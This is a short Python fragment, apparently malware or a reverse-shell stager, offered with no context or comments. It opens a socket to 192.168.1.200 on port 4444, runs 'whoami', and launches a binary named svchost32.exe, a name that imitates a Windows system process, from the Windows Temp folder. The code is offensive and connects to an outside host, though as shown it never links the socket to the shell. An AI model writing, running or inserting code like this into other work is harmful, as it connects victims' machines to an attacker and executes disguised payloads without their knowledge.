import os, socket, subprocess
s = socket.socket()
s.connect(('192.168.1.200', 4444))
os.system('whoami')
subprocess.Popen(['cmd.exe', '/c', 'C:\\Windows\\Temp\\svchost32.exe'])